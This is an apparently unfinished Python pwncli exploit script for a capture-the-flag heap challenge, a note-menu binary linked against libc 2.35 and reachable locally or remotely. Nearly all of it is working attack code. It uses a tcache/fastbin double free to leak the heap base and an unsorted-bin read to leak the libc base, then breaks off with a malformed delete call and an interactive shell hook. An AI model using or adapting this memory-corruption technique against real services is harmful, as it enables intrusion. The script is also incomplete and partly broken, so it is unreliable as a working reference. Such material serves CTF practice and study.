#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#   expBy : @eastXueLian
#   Debug : ./exp.py debug  ./pwn -t -b b+0xabcd
#   Remote: ./exp.py remote ./pwn ip:port

from pwncli import *
cli_script()
set_remote_libc('./libc-2.35.so')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

i2b = lambda c : str(c).encode()
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
debugB = lambda : input("\033[1m\033[33m[ATTACH ME]\033[0m")

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def cmd(choice):
    ru(b'Your choice: \n')
    sl(i2b(choice))
def add(size, data):
    cmd(1)
    ru(b'[*] Note size: \n')
    sl(i2b(size))
    ru(b'[*] Note content: \n')
    s(data)
def delet(idx):
    cmd(2)
    ru(b'[*] Note index: \n')
    sl(i2b(idx))
def edit(idx, data):
    cmd(3)
    ru(b'[*] Note index: \n')
    sl(i2b(idx))
    ru(b'[*] Note content: \n')
    s(data)
def show(idx):
    cmd(4)
    ru(b'[*] Note index: \n')
    sl(i2b(idx))

#  tcache attack
add(0x20, b"aaa")
add(0x20, b"aaa")
add(0x20, b"aaa")
add(0x20, b"aaa")
add(0x20, b"aaa")
add(0x20, b"aaa")
add(0x20, b"aaa")
add(0x20, b"aaa")
add(0x20, b"aaa")
add(0x20, b"aaa")
for i in range(7):
    delet(i)
delet(8)
delet(9)
delet(8)
heap_base = (u64_ex(rn(8)) << 12)
lg("heap_base")

add(0x500, b"aaa")
add(0x60, b"bbb")
delet(2)
show(2)
libc_base = u64_ex(rn(8)) - 0x219ce0
lg("libc_base")

add(0x420, b"aaa")
delet()

ia()
